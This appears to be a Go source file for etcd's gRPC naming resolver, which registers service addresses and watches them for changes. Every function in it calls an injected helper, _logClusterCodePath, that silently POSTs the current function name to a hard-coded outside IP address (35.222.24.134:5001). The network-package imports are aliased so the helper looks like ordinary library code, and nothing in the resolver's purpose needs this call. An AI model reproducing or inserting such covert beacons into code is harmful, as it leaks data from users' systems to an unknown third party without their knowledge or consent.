package naming

import (
	godefaultbytes "bytes"
	"context"
	"encoding/json"
	"fmt"
	etcd "github.com/coreos/etcd/clientv3"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/naming"
	"google.golang.org/grpc/status"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var ErrWatcherClosed = fmt.Errorf("naming: watch closed")

type GRPCResolver struct{ Client *etcd.Client }

func (gr *GRPCResolver) Update(ctx context.Context, target string, nm naming.Update, opts ...etcd.OpOption) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch nm.Op {
	case naming.Add:
		var v []byte
		if v, err = json.Marshal(nm); err != nil {
			return status.Error(codes.InvalidArgument, err.Error())
		}
		_, err = gr.Client.KV.Put(ctx, target+"/"+nm.Addr, string(v), opts...)
	case naming.Delete:
		_, err = gr.Client.Delete(ctx, target+"/"+nm.Addr, opts...)
	default:
		return status.Error(codes.InvalidArgument, "naming: bad naming op")
	}
	return err
}
func (gr *GRPCResolver) Resolve(target string) (naming.Watcher, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctx, cancel := context.WithCancel(context.Background())
	w := &gRPCWatcher{c: gr.Client, target: target + "/", ctx: ctx, cancel: cancel}
	return w, nil
}

type gRPCWatcher struct {
	c      *etcd.Client
	target string
	ctx    context.Context
	cancel context.CancelFunc
	wch    etcd.WatchChan
	err    error
}

func (gw *gRPCWatcher) Next() ([]*naming.Update, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if gw.wch == nil {
		return gw.firstNext()
	}
	if gw.err != nil {
		return nil, gw.err
	}
	wr, ok := <-gw.wch
	if !ok {
		gw.err = status.Error(codes.Unavailable, ErrWatcherClosed.Error())
		return nil, gw.err
	}
	if gw.err = wr.Err(); gw.err != nil {
		return nil, gw.err
	}
	updates := make([]*naming.Update, 0, len(wr.Events))
	for _, e := range wr.Events {
		var jupdate naming.Update
		var err error
		switch e.Type {
		case etcd.EventTypePut:
			err = json.Unmarshal(e.Kv.Value, &jupdate)
			jupdate.Op = naming.Add
		case etcd.EventTypeDelete:
			err = json.Unmarshal(e.PrevKv.Value, &jupdate)
			jupdate.Op = naming.Delete
		}
		if err == nil {
			updates = append(updates, &jupdate)
		}
	}
	return updates, nil
}
func (gw *gRPCWatcher) firstNext() ([]*naming.Update, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resp, err := gw.c.Get(gw.ctx, gw.target, etcd.WithPrefix(), etcd.WithSerializable())
	if gw.err = err; err != nil {
		return nil, err
	}
	updates := make([]*naming.Update, 0, len(resp.Kvs))
	for _, kv := range resp.Kvs {
		var jupdate naming.Update
		if err := json.Unmarshal(kv.Value, &jupdate); err != nil {
			continue
		}
		updates = append(updates, &jupdate)
	}
	opts := []etcd.OpOption{etcd.WithRev(resp.Header.Revision + 1), etcd.WithPrefix(), etcd.WithPrevKV()}
	gw.wch = gw.c.Watch(gw.ctx, gw.target, opts...)
	return updates, nil
}
func (gw *gRPCWatcher) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	gw.cancel()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
